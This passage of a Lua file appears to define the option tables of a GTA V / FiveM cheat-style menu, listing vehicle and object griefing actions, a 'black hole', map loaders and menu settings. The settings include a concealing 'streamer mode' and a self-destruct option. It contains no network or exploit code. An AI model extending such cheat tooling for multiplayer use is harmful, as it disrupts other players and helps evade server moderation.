300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000}},
            {text = 'Body health', dkey = 'world:vehicles_bhealt', desc = 'Set the body health for the vehicles.', afu = __REAPER1__.M.world.vehicles.bodyhealth, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Body health number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Fuck up', dkey = 'world:vehicles_fuckup', desc = 'Fuck up the vehicles.', afu = __REAPER1__.M.world.vehicles.fuckup, option = __REAPER1__.M.Button},
            {text = 'Randomize look', dkey = 'world:vehicles_randomizelook', desc = 'Randomize the look of the vehicles.', afu = __REAPER1__.M.world.vehicles.randomize, option = __REAPER1__.M.Button},
            {text = 'Tune', dkey = 'world:vehicles_tune', desc = 'Tune the vehicles.', afu = __REAPER1__.M.world.vehicles.tune, option = __REAPER1__.M.Button},
            {text = 'Fix', dkey = 'world:vehicles_fix', desc = 'Fix the vehicles.', afu = __REAPER1__.M.world.vehicles.fix, option = __REAPER1__.M.Button},
            {text = 'Cruise (km/h)', dkey = 'world:vehicles_maxspeed', desc = 'Set the maximum speed of the vehicles around\nyou.', afu = __REAPER1__.M.world.vehicles.maxspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Maximum speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set speed (km/h)', dkey = 'world:vehicles_setspeed', desc = 'Set the speed of the vehicles around\nyou.', afu = __REAPER1__.M.world.vehicles.speed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Fuel', dkey = 'world:vehicles_fuel', desc = 'Set the fuel for the vehicles around\nyou.', afu = __REAPER1__.M.world.vehicles.fuel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle fuel number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Remove wheels', dkey = 'world:vehicles_removewheels', desc = 'Remove the wheels of the vehicles.', afu = __REAPER1__.M.world.vehicles.removewheels, option = __REAPER1__.M.Button},
            {text = 'Toggle lock', dkey = 'world:vehicles_togglelock', desc = 'Toggle the lock of the vehicles.', afu = __REAPER1__.M.world.vehicles.lock, option = __REAPER1__.M.Button},
            {text = 'Turn into', dkey = 'world:vehicles_turninto', desc = 'Turn every vehicle around you into\na chosen thing.', afu = __REAPER1__.M.world.vehicles.turninto, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Transformation name', length = 20, tipus = 'betu', func = {'Building', 'Plane', 'Wheel', 'Ufo', 'Blimp'}, extra = {-1404869155, `cargoplane`, `p_ferris_wheel_amo_p`, `p_spinning_anus_s`, `blimp`}},
        },

        ['world:objects'] = {
            {text = 'Delete', dkey = 'world:objects_delete', desc = 'Delete every object.', afu = __REAPER1__.M.world.objects.delete, option = __REAPER1__.M.Button},
            {text = 'Bring', dkey = 'world:objects_bring', desc = 'Bring every object.', afu = __REAPER1__.M.world.objects.bring, option = __REAPER1__.M.Button},
            {text = 'Heading', dkey = 'world:objects_heading', desc = 'Set the heading of the objects around\nyou.', afu = __REAPER1__.M.world.objects.heading, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Heading number', length = 3, tipus = 'szam', func = {}},
            {text = 'Coords', dkey = 'world:objects_coords', desc = 'Set the coords of the objects around\nyou.', afu = __REAPER1__.M.world.objects.coords, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Object coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Invisible', dkey = 'world:objects_invisible', desc = 'Make every object invisible.', afu = __REAPER1__.M.world.objects.invisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'God moded', dkey = 'world:objects_godded', desc = 'Make every object godded.', afu = __REAPER1__.M.world.objects.godded, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Freeze', dkey = 'world:objects_freeze', desc = 'Make every object frozen.', afu = __REAPER1__.M.world.objects.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Explode', dkey = 'world:objects_explode', desc = 'Explode every object.', afu = __REAPER1__.M.world.objects.explode, option = __REAPER1__.M.Button},
            {text = 'Push', dkey = 'world:objects_push', desc = 'Push every object.', afu = __REAPER1__.M.world.objects.push, option = __REAPER1__.M.Button},
            {text = 'No collision', dkey = 'world:objects_nocollision', desc = 'Disable every objects\' collision.', afu = __REAPER1__.M.world.objects.nocollision, option = __REAPER1__.M.Checkbox, func = false},
        },

        ['world:modelchange'] = {
            {text = 'Change', dkey = 'world:modelchange_change', afu = __REAPER1__.M.world.modelchange.change, desc = 'Change object models. Only works with\nobjects. Not networked.', afu = __REAPER1__.M.world.objects.push, option = __REAPER1__.M.Button},
            {text = 'Original object', dkey = 'world:modelchange_originalobj', desc = 'The original object to replace.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Original object name', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'New object', dkey = 'world:modelchange_newobj', desc = 'The object to replace the original one with.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'New object name', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Origin', dkey = 'world:modelchange_origin', desc = 'Where the radius should be calculated\nfrom.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Model change origin', length = 15, tipus = 'betu', func = {'Default', 'Self'}},
            {text = 'Radius', dkey = 'world:modelchange_radius', desc = 'The radius within models should be\nswapped.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Model change radius number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Tizezres},
        },

        ['world:time'] = {
            {text = 'Freeze time', dkey = 'world:time_freezetime', desc = 'Freeze the time and date.', afu = __REAPER1__.M.world.time.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Clock', option = __REAPER1__.M.Separator},
            {text = 'Clear clock', dkey = 'world:time_clearclock', desc = 'Clear the clock time.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Second', dkey = 'world:time_second', desc = 'Set the clock seconds.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Second number', length = 2, tipus = 'szam', toggle = false, func = {0, 1 ,2 ,3 ,4 ,5 ,6 ,7 ,8 ,9 ,10 ,11 ,12 ,13 ,14 ,15 ,16 ,17 ,18 ,19 ,20 ,21 ,22 ,23 ,24 ,25 ,26 ,27 ,28 ,29 ,30 ,31 ,32 ,33 ,34 ,35 ,36 ,37 ,38 ,39 ,40 ,41 ,42 ,43 ,44 ,45 ,46 ,47 ,48 ,49 ,50 ,51 ,52 ,53 ,54 ,55 ,56 ,57 ,58 ,59 ,60}},
            {text = 'Minute', dkey = 'world:time_minute', desc = 'Set the clock minute.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Minute number', length = 2, tipus = 'szam', toggle = false, func = {0, 1 ,2 ,3 ,4 ,5 ,6 ,7 ,8 ,9 ,10 ,11 ,12 ,13 ,14 ,15 ,16 ,17 ,18 ,19 ,20 ,21 ,22 ,23 ,24 ,25 ,26 ,27 ,28 ,29 ,30 ,31 ,32 ,33 ,34 ,35 ,36 ,37 ,38 ,39 ,40 ,41 ,42 ,43 ,44 ,45 ,46 ,47 ,48 ,49 ,50 ,51 ,52 ,53 ,54 ,55 ,56 ,57 ,58 ,59 ,60}},
            {text = 'Hour', dkey = 'world:time_hour', desc = 'Set the clock hour.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Hour number', length = 2, tipus = 'szam', toggle = false, func = {0, 1 ,2 ,3 ,4 ,5 ,6 ,7 ,8 ,9 ,10 ,11 ,12 ,13 ,14 ,15 ,16 ,17 ,18 ,19 ,20 ,21 ,22 ,23 ,24}},
            {text = 'Display time', dkey = 'world:time_displaytime', desc = 'Display the current time.', afu = __REAPER1__.M.world.time.displaytime, option = __REAPER1__.M.Button},
            {text = 'Date', option = __REAPER1__.M.Separator},
            {text = 'Day', dkey = 'world:time_day', desc = 'Set the current day in game.', afu = __REAPER1__.M.world.time.day, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Day number', length = 2, tipus = 'szam', func = {1 ,2 ,3 ,4 ,5 ,6 ,7 ,8 ,9 ,10 ,11 ,12 ,13 ,14 ,15 ,16 ,17 ,18 ,19 ,20 ,21 ,22 ,23 ,24 ,25 ,26 ,27 ,28 ,29 ,30 ,31}},
            {text = 'Month', dkey = 'world:time_month', desc = 'Set the current month in game.', afu = __REAPER1__.M.world.time.month, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Month number', length = 2, tipus = 'szam', func = {1 ,2 ,3 ,4 ,5 ,6 ,7 ,8 ,9 ,10 ,11 ,12}},
            {text = 'Year', dkey = 'world:time_year', desc = 'Set the current year in game.', afu = __REAPER1__.M.world.time.year, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Year number', length = 5, tipus = 'szam', func = 2021},
            {text = 'Display date', dkey = 'world:time_displaydate', desc = 'Display the current date.', afu = __REAPER1__.M.world.time.displaydate, option = __REAPER1__.M.Button},
        },

        ['world:blackmagic'] = {
            {text = 'Black hole', dkey = 'world:blackmagic_blackhole', desc = 'Create a black hole which will suck in\n:flushed: entities.', afu = __REAPER1__.M.world.blackmagic.blackhole, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Position', dkey = 'world:blackmagic_position', desc = 'The black hole position.', afu = __REAPER1__.M.world.blackmagic.pos, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Black hole coords', length = 30, tipus = 'vegyes', func = '0.0 0.0 0.0'},
            {text = 'Set to self', dkey = 'world:blackmagic_settoself', desc = 'Set the black hole to your position.', afu = __REAPER1__.M.world.blackmagic.bself, option = __REAPER1__.M.Button},
            {text = 'Set key', dkey = 'world:blackmagic_positionkey', desc = 'When they key is pressed blackhole\nwill be set where you are looking at.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Set key', length = 3, tipus = 'betu', toggle = false, func = __REAPER1__.T.Keys},
            {text = 'Strength', dkey = 'world:blackmagic_strength', desc = 'How strong the black hole should be.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Black hole strength number', length = 3, tipus = 'betu', func = __REAPER1__.T.Szazas},
            {text = 'Pedestrians', dkey = 'world:blackmagic_pedestrians', desc = 'Apply the black hole on pedestrians.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Vehicles', dkey = 'world:blackmagic_vehicles', desc = 'Apply the black hole on vehicles.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Push when off', dkey = 'world:blackmagic_pushwhenoff', desc = 'Push the entities with the set strength when\nturning off blackhole in the direction you\nare looking.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Indicator', dkey = 'world:blackmagic_indicator', desc = 'Draw where the black hole will be.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Indicator color', dkey = 'world:blackmagic_color', desc = 'Set the color and alpha of the indicator.\nFormat: r g b a.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Indicator color', length = 15, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0, a = 0}, func = '0 0 0 0'},
        },

        ['world:iplloader'] = {
            {text = 'Unload', dkey = 'world:iplloader_unload', desc = 'Unload the selected ipls instead of loading.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'IPL PACKS', option = __REAPER1__.M.Separator},
            {text = 'Default', dkey = 'world:iplloader:default', desc = 'Default gta ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:default'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Online', dkey = 'world:iplloader:online', desc = 'Online dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:online'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Afterhours', dkey = 'world:iplloader:afterhours', desc = 'Afterhours dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:afterhours'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Bikers', dkey = 'world:iplloader:afterhours', desc = 'Afterhours dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:afterhours'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Doomsday', dkey = 'world:iplloader:afterhours', desc = 'Afterhours dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:afterhours'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Executive', dkey = 'world:iplloader:afterhours', desc = 'Afterhours dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:afterhours'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Finance', dkey = 'world:iplloader:afterhours', desc = 'Afterhours dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:afterhours'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Gunrunning', dkey = 'world:iplloader:afterhours', desc = 'Afterhours dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:afterhours'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Heists', dkey = 'world:iplloader:afterhours', desc = 'Afterhours dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:afterhours'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'High life', dkey = 'world:iplloader:afterhours', desc = 'Afterhours dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:afterhours'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Import', dkey = 'world:iplloader:afterhours', desc = 'Afterhours dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:afterhours'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Smuggler', dkey = 'world:iplloader:afterhours', desc = 'Afterhours dlc ipl menu.', option = __REAPER1__.M.Menu_Button, func = {'world:iplloader', 'world:iplloader:afterhours'}, lasto = 1, scrollo = 0, addedo = 0},
        },

        ['world:iplloader:default'] = {
            {text = 'Ammunation', dkey = 'world:iplloader:default_ammunation', desc = 'Load/Unload all the ammunation ipls.', afu = __REAPER1__.M.world.iplloader.default.ammunation, option = __REAPER1__.M.Button},
            {text = 'Bahama', dkey = 'world:iplloader:default_bahama', desc = 'Load/Unload all the bahama ipls.', afu = __REAPER1__.M.world.iplloader.default.bahama, option = __REAPER1__.M.Button},
            {text = 'Base', dkey = 'world:iplloader:default_base', desc = 'Load/Unload all the base ipls.', afu = __REAPER1__.M.world.iplloader.default.base, option = __REAPER1__.M.Button},
            {text = 'Floyd', dkey = 'world:iplloader:default_floyd', desc = 'Load/Unload all the floyd ipls.', afu = __REAPER1__.M.world.iplloader.default.floyd, option = __REAPER1__.M.Button},
            {text = 'Franklin', dkey = 'world:iplloader:default_franklin', desc = 'Load/Unload all the franklin ipls.', afu = __REAPER1__.M.world.iplloader.default.franklin, option = __REAPER1__.M.Button},
            {text = 'Franklin aunt', dkey = 'world:iplloader:default_franklinaunt', desc = 'Load/Unload all the franklin aunt ipls.', afu = __REAPER1__.M.world.iplloader.default.franklinaunt, option = __REAPER1__.M.Button},
            {text = 'Graffiti', dkey = 'world:iplloader:default_graffiti', desc = 'Load/Unload all the graffiti ipls.', afu = __REAPER1__.M.world.iplloader.default.graffiti, option = __REAPER1__.M.Button},
            {text = 'Lester factory', dkey = 'world:iplloader:default_lesterfac', desc = 'Load/Unload all the lester factory ipls.', afu = __REAPER1__.M.world.iplloader.default.lesterfactory, option = __REAPER1__.M.Button},
            {text = 'Michael', dkey = 'world:iplloader:default_michael', desc = 'Load/Unload all the michael ipls.', afu = __REAPER1__.M.world.iplloader.default.michael, option = __REAPER1__.M.Button},
            {text = 'North yankton', dkey = 'world:iplloader:default_northyankton', desc = 'Load/Unload all the north yankton ipls.', afu = __REAPER1__.M.world.iplloader.default.northyankton, option = __REAPER1__.M.Button},
            {text = 'Pillbox hospital', dkey = 'world:iplloader:default_pillbox', desc = 'Load/Unload all the pillbox hospital ipls.', afu = __REAPER1__.M.world.iplloader.default.pillboxhospital, option = __REAPER1__.M.Button},
            {text = 'Red carpet', dkey = 'world:iplloader:default_redcarpet', desc = 'Load/Unload all the red carpet ipls.', afu = __REAPER1__.M.world.iplloader.default.redcarpet, option = __REAPER1__.M.Button},
            {text = 'Simeon', dkey = 'world:iplloader:default_simeon', desc = 'Load/Unload all the simeon ipls.', afu = __REAPER1__.M.world.iplloader.default.simeon, option = __REAPER1__.M.Button},
            {text = 'Stripclub', dkey = 'world:iplloader:default_stripclub', desc = 'Load/Unload all the stripbluc ipls.', afu = __REAPER1__.M.world.iplloader.default.stripclub, option = __REAPER1__.M.Button},
            {text = 'Trevor\'s trailer', dkey = 'world:iplloader:default_trevoertrailer', desc = 'Load/Unload all the trevor\'s trailer ipls.', afu = __REAPER1__.M.world.iplloader.default.trevorstrailer, option = __REAPER1__.M.Button},
            {text = 'Ufo', dkey = 'world:iplloader:default_ufo', desc = 'Load/Unload all the ufo ipls.', afu = __REAPER1__.M.world.iplloader.default.ufo, option = __REAPER1__.M.Button},
            {text = 'Zancudo gates', dkey = 'world:iplloader:default_zancudogates', desc = 'Load/Unload all the zancudo gates ipls.', afu = __REAPER1__.M.world.iplloader.default.zancudogates, option = __REAPER1__.M.Button},
        },

        ['world:iplloader:online'] = {
            {text = 'Apartment 1', dkey = 'world:iplloader:online_apartment1', desc = 'Load/Unload all the online apartment 1 ipls.', afu = __REAPER1__.M.world.iplloader.online.apartment1, option = __REAPER1__.M.Button},
            {text = 'Apartment 2', dkey = 'world:iplloader:online_apartment2', desc = 'Load/Unload all the online apartment 2 ipls.', afu = __REAPER1__.M.world.iplloader.online.apartment2, option = __REAPER1__.M.Button},
            {text = 'House 1', dkey = 'world:iplloader:online_house1', desc = 'Load/Unload all the online house 1 ipls.', afu = __REAPER1__.M.world.iplloader.online.house1, option = __REAPER1__.M.Button},
            {text = 'House 2', dkey = 'world:iplloader:online_house2', desc = 'Load/Unload all the online house 2 ipls.', afu = __REAPER1__.M.world.iplloader.online.house2, option = __REAPER1__.M.Button},
            {text = 'House 3', dkey = 'world:iplloader:online_house3', desc = 'Load/Unload all the online house 3 ipls.', afu = __REAPER1__.M.world.iplloader.online.house3, option = __REAPER1__.M.Button},
            {text = 'House 4', dkey = 'world:iplloader:online_house4', desc = 'Load/Unload all the online house 4 ipls.', afu = __REAPER1__.M.world.iplloader.online.house4, option = __REAPER1__.M.Button},
            {text = 'House 5', dkey = 'world:iplloader:online_house5', desc = 'Load/Unload all the online house 5 ipls.', afu = __REAPER1__.M.world.iplloader.online.house5, option = __REAPER1__.M.Button},
            {text = 'House 6', dkey = 'world:iplloader:online_house6', desc = 'Load/Unload all the online house 6 ipls.', afu = __REAPER1__.M.world.iplloader.online.house6, option = __REAPER1__.M.Button},
            {text = 'House 7', dkey = 'world:iplloader:online_house7', desc = 'Load/Unload all the online house 7 ipls.', afu = __REAPER1__.M.world.iplloader.online.house7, option = __REAPER1__.M.Button},
            {text = 'House 8', dkey = 'world:iplloader:online_house8', desc = 'Load/Unload all the online house 8 ipls.', afu = __REAPER1__.M.world.iplloader.online.house8, option = __REAPER1__.M.Button},
            {text = 'House low 1', dkey = 'world:iplloader:online_houselow1', desc = 'Load/Unload all the online house low 1 ipls.', afu = __REAPER1__.M.world.iplloader.online.houselow1, option = __REAPER1__.M.Button},
            {text = 'House mid 1', dkey = 'world:iplloader:online_housemid1', desc = 'Load/Unload all the online house mid 1 ipls.', afu = __REAPER1__.M.world.iplloader.online.housemid1, option = __REAPER1__.M.Button},
        },

        ['world:iplloader:afterhours'] = {
            --{text = 'Night clubs', dkey = 'world:iplloader:afterhours_nightclubs', desc = 'Load/Unload all the afterhours nigth club ipls.', afu = __REAPER1__.M.world.iplloader.afterhours.nightclubs, option = __REAPER1__.M.Button},
        },

        ['settings'] = {
            {text = 'Configs', dkey = 'settings:configs', desc = 'Configs menu.', option = __REAPER1__.M.Menu_Button, func = {'settings', 'settings:configs'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'Language', dkey = 'settings:language', desc = 'Language menu.', option = __REAPER1__.M.Menu_Button, func = {'settings', 'settings:language'}, lasto = 1, scrollo = 0, addedo = 0},
            {text = 'General', option = __REAPER1__.M.Separator},
            {text = 'Reset to defaults', dkey = 'settings_reset', desc = 'Reset every menu setting to the default.', afu = __REAPER1__.M.settings.reset, option = __REAPER1__.M.Button},
            {text = 'Destroy menu', dkey = 'settings_destroymenu', desc = 'Destroy the menu.', afu = __REAPER1__.M.settings.destroy, option = __REAPER1__.M.Button},
            {text = 'Streamer mode', dkey = 'settings_streamermode', desc = 'Won\'t be able to open the menu, visual\nrelated drawings/text will disappear.\nIrreversible.', afu = __REAPER1__.M.settings.streamer, option = __REAPER1__.M.Button},
            {text = 'Destroy timer', dkey = 'settings_destroytimer', desc = 'The time to hold the open key for\nto destroy the menu in miliseconds.', option = __REAPER1__.M.Combo, cindex = 1000, sindex = 1000, textboxtext = 'Destroy time in seconds', length = 5, tipus = 'szam', func = __REAPER1__.T.Tizezres},
            {text = 'Scroll speed', dkey = 'settings_scrollspeed', desc = 'The scrolling speed.', option = __REAPER1__.M.Combo, cindex = 100, sindex = 100, textboxtext = 'Scroll speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Switch speed', dkey = 'settings_switchspeed', desc = 'The switch speed (combo).', option = __REAPER1__.M.Combo, cindex = 70, sindex = 70, textboxtext = 'Switch speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Last option', dkey = 'settings_lastoption', desc = 'When opening a menu selected option\nwill be the last option.', option = __REAPER1__.M.Checkbox, func = true},
            {text = 'Combo slider', dkey = 'settings_comboslider', desc = 'Toggle the slider on the combobox.', option = __REAPER1__.M.Checkbox, func = true},
            {text = 'Combo instant switch', dkey = 'settings_comboiswitch', desc = 'When switching between combo values,\nit will instantly apply instead of having to\npress enter.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Menu elements', option = __REAPER1__.M.Separator},
            {text = 'Infobox', dkey = 'settings_infobox', desc = 'Toggle the infobox.', option = __REAPER1__.M.Checkbox, func = true},
            {text = 'Notifications', dkey = 'settings_notifications', desc = 'Toggle the notifications.', option = __REAPER1__.M.Checkbox, func = true},
            {text = 'Images', dkey = 'settings_images', desc = 'Toggle the images on weapons, models\netc...', option = __REAPER1__.M.Checkbox, func = true},
            {text = 'Player data', dkey = 'settings_playerdata', desc = 'Toggle theplayer data box on online\nplayers.', option = __REAPER1__.M.Checkbox, func = true},
            {text = 'Help text', dkey = 'settings_helptext', desc = 'Draw the help text for the menu/freecam\nin the bottom right corner.', option = __REAPER1__.M.Checkbox, func = true},
            {text = 'Keys', option = __REAPER1__.M.Separator},
            {text = 'Menu', dkey = 'settings_menu', desc = 'The menu open key.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Menu open key', length = 1, tipus = 'bind', func = '', extra = 0},
            {text = 'Textbox', dkey = 'settings_textbox', desc = 'The textbox key.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Textbox key', length = 1, tipus = 'bind', func = 'x', extra = 56},
            {text = 'Binding', dkey = 'settings_bind', desc = 'The binding key.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Binding key', length = 1, tipus = 'bind', func = 'F10', extra = 95},
            {text = 'Cursor', dkey = 'settings_cursor', desc = 'The cursor toggle key.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Cursor toggle key', length = 1, tipus = 'bind', func = 'g', extra = 39},
            {text = 'Chat box', dkey = 'settings_chatbox', desc = 'The chatbox toggle key.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Chatbox toggle key', length = 1, tipus = 'bind', func = 'pgup', extra = 13},
            {text = 'Position', option = __REAPER1__.M.Separator},
            {text = 'Position x', dkey = 'settings_positionx', desc = 'The menu position on the x axis.', option = __REAPER1__.M.Combo, cindex = 102, sindex = 102, textboxtext = 'Position x axis number', length = 5, tipus = 'szam', func = __REAPER1__.T.Float},
            {text = 'Position y', dkey = 'settings_positiony', desc = 'The menu position on the y axis.', option = __REAPER1__.M.Combo, cindex = 302, sindex = 302, textboxtext = 'Position y axis number', length = 5, tipus = 'szam', func = __REAPER1__.T.Float},
            {text = 'Width x', dkey = 'settings_widthx', desc = 'The menu width on the x axis.', option = __REAPER1__.M.Combo, cindex = 195, sindex = 195, textboxtext = 'Width x axis number', length = 5, tipus = 'szam', func = __REAPER1__.T.Float},
            {text = 'Width y', dkey = 'settings_widthy', desc = 'The menu width on the y axis.', option = __REAPER1__.M.Combo, cindex = 402, sindex = 402, textboxtext = 'Width y axis number', length = 5, tipus = 'szam', func = __REAPER1__.T.Float},
            {text = 'Sounds', option = __REAPER1__.M.Separator},
            {text = 'Default', dkey = 'settings_defaultsounds', desc = 'Toggle the default menu sounds.', option = __REAPER1__.M.Checkbox, func = true},
            {text = 'Binding', dkey = 'settings_bindingsounds', desc = 'Toggle the binding sounds.', option = __REAPER1__.M.Checkbox, func = true},
            {text = 'Design', option = __REAPER1__.M.Separator},
            {text = 'Menu fade', dkey = 'settings_menufade', desc = 'Toggle the fade effect when closing\nor opening the menu.', option = __REAPER1__.M.Checkbox, func = true},
